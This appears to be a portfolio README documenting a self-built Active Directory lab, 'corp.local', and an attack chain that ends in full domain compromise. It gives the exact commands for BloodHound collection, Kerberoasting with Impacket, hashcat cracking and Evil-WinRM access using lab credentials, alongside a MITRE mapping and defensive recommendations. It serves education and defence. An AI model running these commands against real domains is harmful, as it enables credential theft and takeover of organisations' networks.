# Active Directory Attack Lab — CORP.LOCAL

![Platform](https://img.shields.io/badge/platform-Active%20Directory-blue)
![OS](https://img.shields.io/badge/target-Windows%20Server%202022-0078D6)
![Attacker](https://img.shields.io/badge/attacker%20OS-Kali%20Linux-557C94)
![Technique](https://img.shields.io/badge/technique-Kerberoasting-red)
![Status](https://img.shields.io/badge/domain%20compromise-Achieved-success)
![License](https://img.shields.io/badge/license-MIT-lightgrey)

> A fully self-hosted Active Directory attack range built end-to-end (domain provisioning → misconfiguration seeding → exploitation → full domain compromise) to demonstrate practical adversary tradecraft against a realistic enterprise identity environment.

**Note on scope:** All hostnames, IP addresses, usernames, and credentials below are exact values from an isolated, non-routable lab environment (`192.168.100.0/24`, VirtualBox host-only/NAT networking) built specifically for this exercise. No production systems, real organizations, or real individuals are represented.

---

## Table of Contents

- [Project Overview](#project-overview)
- [Objectives](#objectives)
- [Lab Environment](#lab-environment)
- [Network Diagram](#network-diagram)
- [Active Directory Architecture](#active-directory-architecture)
- [Attack Workflow](#attack-workflow)
- [Enumeration](#enumeration)
- [BloodHound Analysis](#bloodhound-analysis)
- [Kerberoasting](#kerberoasting)
- [Password Recovery](#password-recovery)
- [WinRM Access](#winrm-access)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Defensive Recommendations](#defensive-recommendations)
- [Lessons Learned](#lessons-learned)
- [Skills Demonstrated](#skills-demonstrated)
- [Future Improvements](#future-improvements)
- [References](#references)

---

## Project Overview

This project documents the design, build, and compromise of a single-forest Active Directory lab (`corp.local`) modeled on a small enterprise environment. I built the domain controller and member workstations from scratch, deliberately seeded realistic misconfigurations that show up repeatedly in real-world AD assessments, and then performed a full attack chain from an unauthenticated/low-privilege starting position through to **Domain Admin**.

The point of this project is not "run a tool and get a flag" — it's to demonstrate the full consulting workflow: enumerate methodically, validate findings with a graph-based tool (BloodHound) before acting, execute a targeted attack technique (Kerberoasting) instead of a blind spray, and document everything the way a client-facing report requires.

## Objectives

- Stand up a realistic single-domain AD environment with OUs, groups, service accounts, and workstations.
- Practice the full internal AD enumeration methodology (SMB, LDAP, `net` commands, `crackmapexec`).
- Use BloodHound to identify a real, non-obvious privilege escalation path rather than guessing.
- Execute Kerberoasting against a vulnerable service account and recover its plaintext password offline.
- Achieve interactive remote access (WinRM) and confirm full domain compromise.
- Map every step to MITRE ATT&CK and produce defensive guidance a blue team could act on.

## Lab Environment

| Component | Detail |
|---|---|
| Hypervisor | Oracle VirtualBox |
| Domain Controller | `DC01` — Windows Server 2022 Standard (Evaluation), Build 20348, IP `192.168.100.10` |
| Domain | `corp.local` (single domain, single forest) |
| Workstation 1 | `SALES-PC.corp.local` — Windows 10, IP `192.168.100.20` |
| Workstation 2 | `USER-PC.corp.local` — Windows 10, IP `192.168.100.30` |
| Attacker host | Kali Linux 2025.1a, IP within `192.168.100.0/24` |
| Networking | Host-only/internal network, `192.168.100.0/24` (built from an initial NAT/host-only `10.0.2.15` / `192.168.56.10` setup, later re-addressed to the lab subnet) |
| SMB Signing | Enabled (`True`) on DC01 | 
| SMBv1 | Disabled |
| Directory tooling | Active Directory Users and Computers, Server Manager, DNS Manager |
| Attacker tooling | CrackMapExec, smbclient, Impacket (`GetUserSPNs.py`), hashcat, `bloodhound-python`/BloodHound + Neo4j, Evil-WinRM |

## Repository Structure

```
ad-attack-lab-corp-local/
├── README.md
├── LICENSE
├── docs/
│   └── penetration-testing-report.md
├── diagrams/
│   └── network-diagram.md          (network, AD tree, attack flow, Kerberoasting sequence,
│                                     BloodHound path, and MITRE flow diagrams as Mermaid)
├── screenshots/
│   ├── 00-setup/                   (AD DS build, OU/user/group provisioning, WinRM/network config)
│   ├── 01-recon-enumeration/       (SMB/LDAP enumeration as initial user js)
│   ├── 03-bloodhound/              (collection + graph analysis)
│   ├── 04-kerberoasting/           (impacket-GetUserSPNs)
│   ├── 05-hashcat/                 (offline password cracking)
│   ├── 06-winrm-access/            (Evil-WinRM shell establishment)
│   └── 07-post-exploitation/       (privilege confirmation + host enumeration)
└── notes/
    ├── screenshot-mapping.md       
    ├── portfolio-review.md         (recruiter/hiring-manager/senior-pentester review)
    └── github-repo-metadata.md     (suggested repo name, description, topics)
```

## Network Diagram

See [`diagrams/network-diagram.md`](diagrams/network-diagram.md) for the full description and recreation instructions.

```
                    ┌─────────────────────────┐
                    │   Kali Linux (Attacker) │
                    │   192.168.100.x         │
                    └────────────┬────────────┘
                                 │
                    192.168.100.0/24 (internal)
                 ┌───────────────┼───────────────┐
                 │               │               │
        ┌────────▼───────┐ ┌────▼────────┐ ┌────▼────────┐
        │ DC01            │ │ SALES-PC    │ │ USER-PC     │
        │ 192.168.100.10  │ │192.168.100.20│ │192.168.100.30│
        │ Windows Server  │ │ Windows 10   │ │ Windows 10   │
        │ 2022 (DC)       │ │ (domain-     │ │ (domain-     │
        │ corp.local      │ │  joined)     │ │  joined)     │
        └─────────────────┘ └──────────────┘ └──────────────┘
```

## Active Directory Architecture

**Domain:** `corp.local`

**Organizational Units:**

| OU | Purpose |
|---|---|
| IT | IT staff, incl. `john smith` (member of **IT Admins**) |
| HR | HR staff, incl. `mary hr` |
| Finance | Finance staff, incl. `bob finance` |
| Sales | Sales staff, incl. `alice sales` |
| Servers | Server-tier computer objects |
| Workstations | Client-tier computer objects |
| Managed Service Accounts | Reserved for gMSAs (unused/empty in this build) |
| Users (default container) | `Administrator`, `Guest`, `help desk`, `intern 1`, `intern 2`, `svc backup`, `svc sql` |

**User accounts (14 total):**

| Username | Display Name | Notable Group Membership |
|---|---|---|
| `Administrator` | Built-in Administrator | Domain Admins, Enterprise Admins, Schema Admins |
| `js` | john smith | **IT Admins** |
| `hr` | mary hr | HR Group |
| `bob` | bob finance | Finance |
| `as` | alice sales | Sales |
| `hd` | help desk | Help Desk |
| `i1` | intern 1 | Domain Users |
| `i2` | intern 2 | Domain Users |
| `svc_backup` | svc backup | Backup-Operators |
| `svc_sql` | svc sql | **SQL Admin, Domain Admins** ⚠️ |
| `krbtgt` | — | Key Distribution Center Service Account (built-in) |
| `Guest` | — | Disabled built-in account |

**Custom groups:** `SQL Admin`, `Sales`, `Finance`, `HR Group`, `IT`, `IT Admins`, `Help Desk`, `Backup-Operators` (in addition to ~50 built-in AD groups such as Domain Admins, Enterprise Admins, Schema Admins, DnsAdmins, Protected Users, etc.)

**Computers:** `DC01` (Domain Controllers OU), `SALES-PC`, `USER-PC` (Computers container)

**Critical design flaw (intentional):** `svc_sql`, a SQL service account meant to be scoped to database administration (`SQL Admin` group, holding an SPN `MSSQLSvc/DC01.corp.local:1433`), was **also placed directly into Domain Admins**. This single misconfiguration is what turns a routine Kerberoasting finding into full domain compromise, and it is the crux of this entire exercise.

**Secondary design flaw (intentional):** the `svc_sql` account's AD **Description field** contains a plaintext password hint (`Mypass is Password$vc`), and a non-default SMB share (`attacklab`) was created with **READ/WRITE** access for a standard domain user (`js`) — both are realistic misconfigurations documented independently of the Kerberoasting path (see [Enumeration](#enumeration)).

## Attack Workflow

```
1. Environment Build            → AD DS promotion, OU/user/group provisioning,
                                   share + WinRM configuration, workstation domain-join
2. Initial Access (assumed)      → Foothold as standard domain user js:Password123!
3. SMB / LDAP / AD Enumeration   → Users, groups, shares, computers via CME, smbclient, ldapsearch
4. BloodHound Collection         → bloodhound-python collection (14 users, 60 groups, 3 computers)
5. BloodHound Analysis           → Kerberoastable-account query surfaces svc_sql
6. Kerberoasting                 → impacket-GetUserSPNs requests TGS for svc_sql's SPN
7. Offline Cracking              → hashcat + rockyou.txt recovers svc_sql:Password@123
8. Remote Access                 → Evil-WinRM / CrackMapExec authenticate as svc_sql
9. Privilege Confirmation        → whoami /all confirms svc_sql ∈ Domain Admins (full compromise)
10. Post-Exploitation Enum       → systeminfo, net group, services, scheduled tasks, credential sweep
```

Full narrative detail for each stage is in [`docs/penetration-testing-report.md`](docs/penetration-testing-report.md).

## Enumeration

Using the initial `js` credential, SMB/AD enumeration was performed with `crackmapexec`, `smbclient`, and native `net` commands against `DC01` (`192.168.100.10`):

- Confirmed target: Windows Server 2022 Build 20348, SMB signing enabled, SMBv1 disabled.
- Enumerated all 14 domain users and ~50+ domain groups.
- Enumerated SMB shares — found the standard `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`, **plus a non-standard `attacklab` share with READ/WRITE granted to a standard user**.
- Enumerated domain computers (`Get-ADComputer -Filter *`) — `DC01`, `SALES-PC`, `USER-PC`.
- Ran an LDAP dump (`ldapsearch`) authenticated as `js` to pull full user object attributes.
- Searched the filesystem for hardcoded secrets (`Select-String -Pattern "password|secret|..."`) — returned only false positives from PowerShell Pester test-module fixtures, a useful example of enumeration with a documented negative result.
- Confirmed no cached credentials via `cmdkey /list`.

## BloodHound Analysis

Collection was performed with `bloodhound-python` against `corp.local` using the `js` credential:

```
bloodhound-python -u js -p 'Password123!' -d corp.local -ns 192.168.100.10 -c All
```

Results: 1 domain, 3 computers, 14 users, 60 groups, 8 OUs, 2 GPOs, 19 containers, 0 trusts. Imported into BloodHound (Neo4j-backed) for graph analysis.

Using the built-in **Kerberos Interaction → "List all Kerberoastable Accounts"** query, `svc_sql` was identified as the only Kerberoastable non-krbtgt account in the domain. Pivoting to `svc_sql`'s node, its **effective group membership** and the **Shortest Path to Domain Admins from Kerberoastable Users** query confirmed a direct, one-hop path: `svc_sql → (MemberOf) → Domain Admins`. This is the key decision point — it told me exactly which service account to target instead of Kerberoasting every SPN in the domain blindly.

## Kerberoasting

With the target identified, the SPN was confirmed and the ticket requested using Impacket:

```
impacket-GetUserSPNs corp.local/js:'Password123!' -dc-ip 192.168.100.10
# → MSSQLSvc/DC01.corp.local:1433   svc_sql   MemberOf: CN=SQL Admin,OU=Groups,DC=corp,DC=local

impacket-GetUserSPNs corp.local/js:'Password123!' -dc-ip 192.168.100.10 -request
# → dumps a $krb5tgs$23$... (RC4-HMAC / etype 23) TGS-REP hash for svc_sql
```

## Password Recovery

The recovered TGS-REP hash was cracked offline with hashcat mode `13100` (Kerberos 5, etype 23, TGS-REP) against `rockyou.txt`:

```
hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt
# Status: Cracked
# $krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*...:Password@123
```

Crack time: under 2 seconds — the password was present in the standard `rockyou.txt` dictionary, i.e., not remotely resistant to an offline dictionary attack.

## WinRM Access

Authenticated access as `svc_sql` was validated and established:

```
crackmapexec smb 192.168.100.10 -u svc_sql -p 'Password@123'        # [+] valid
evil-winrm -i 192.168.100.10 -u svc_sql -p 'Password@123'           # shell established
```

From the resulting shell:

```
whoami            → corp\svc_sql
whoami /groups    → CORP\SQL Admin, CORP\Domain Admins  ← full compromise confirmed
whoami /priv      → SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc. all Enabled
systeminfo        → Host: DC01, OS Configuration: Primary Domain Controller, Domain: corp.local
```

An initial `evil-winrm`/`crackmapexec winrm` attempt returned `WinRM::WinRMAuthorizationError`; this is included in the report as a documented enumeration/troubleshooting step rather than omitted, consistent with how real engagements actually go.

## MITRE ATT&CK Mapping

Full table in [`docs/penetration-testing-report.md`](docs/penetration-testing-report.md#mitre-attck-mapping). Summary:

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance / Discovery | Account Discovery: Domain Account | T1087.002 |
| Discovery | Network Share Discovery | T1135 |
| Discovery | Remote System Discovery | T1018 |
| Discovery | Domain Trust Discovery / AD Object enumeration | T1482 / T1069.002 |
| Credential Access | **Kerberoasting** | **T1558.003** |
| Credential Access | Brute Force: Password Cracking | T1110.002 |
| Lateral Movement | Remote Services: Windows Remote Management | T1021.006 |
| Privilege Escalation | Valid Accounts: Domain Accounts | T1078.002 |
| Credential Access | Unsecured Credentials (Group Policy / Description fields) | T1552.006 / T1552.001 |

## Defensive Recommendations

Full detail in the report. Highlights:

1. **Never place service accounts in Domain Admins.** Use least-privilege delegated permissions scoped to what the service actually needs (e.g., SQL Server service accounts should use Managed Service Accounts/gMSAs, not standing domain-privileged accounts).
2. **Enforce strong, unique passwords for service accounts** and rotate on a schedule — `svc_sql`'s password was recovered from `rockyou.txt` in under 2 seconds.
3. **Migrate SPN-bearing accounts to gMSAs** where possible to eliminate Kerberoastable attack surface entirely.
4. **Monitor for Kerberoasting indicators**: Event ID 4769 with encryption type `0x17` (RC4) requested for service accounts, especially in bulk/rapid succession.
5. **Never store credentials or hints in AD attribute fields** (Description, notes, etc.) — these are readable by any authenticated user by default.
6. **Restrict SMB share permissions** — the `attacklab` share granting `Everyone`/standard-user READ/WRITE is a common real-world finding.
7. Deploy **BloodHound defensively** (or Purple Knight / PingCastle) on a recurring cadence to catch these paths before an attacker's BloodHound run does.

## Lessons Learned

**As attacker:** the highest-leverage moment in this engagement wasn't a tool — it was the decision to run BloodHound's Kerberoastable-accounts query *before* Kerberoasting blindly. That turned a "spray every SPN and hope" approach into a single, surgical, low-noise request against exactly one account that was already known to be Domain Admin.

**As defender:** this entire chain — from standard domain user to Domain Admin — required zero exploits, zero malware, and zero unpatched vulnerabilities. It is entirely a product of **access control misconfiguration** (a service account in Domain Admins) compounded by **weak credential hygiene** (a dictionary-crackable password). This is the norm, not the exception, in real internal AD assessments.

## Skills Demonstrated

- Active Directory design, provisioning, and OU/GPO structuring
- Windows Server 2022 administration (AD DS, DNS, Server Manager, WinRM)
- Offensive AD enumeration (CrackMapExec, smbclient, `net`, `ldapsearch`)
- Graph-based attack path analysis with BloodHound / Neo4j
- Kerberoasting via Impacket
- Offline password cracking with hashcat (rule/dictionary attacks)
- Remote command execution via WinRM (Evil-WinRM)
- Professional penetration test reporting and MITRE ATT&CK mapping

## Future Improvements

- Add AS-REP Roasting demonstration (`DontReqPreAuth`) — BloodHound's query for this was available but not exercised in this build.
- Add a Group Policy Preferences (cpassword) misconfiguration scenario.
- Introduce a constrained/unconstrained delegation path for a second privilege-escalation vector.
- Add centralized logging (Windows Event Forwarding + Sysmon) to produce a matching **detection** writeup with real Event IDs, closing the loop between attack and defense.
- Automate the lab build with Vagrant/Packer + a PowerShell DSC or Ansible configuration for full reproducibility.

## References

- MITRE ATT&CK: https://attack.mitre.org/
- Impacket: https://github.com/fortra/impacket
- BloodHound: https://github.com/SpecterOps/BloodHound
- CrackMapExec: https://github.com/Porchetta-Industries/CrackMapExec
- Evil-WinRM: https://github.com/Hackplayers/evil-winrm
- hashcat: https://hashcat.net/hashcat/

---

*This lab was built, attacked, and documented independently for educational and portfolio purposes.*
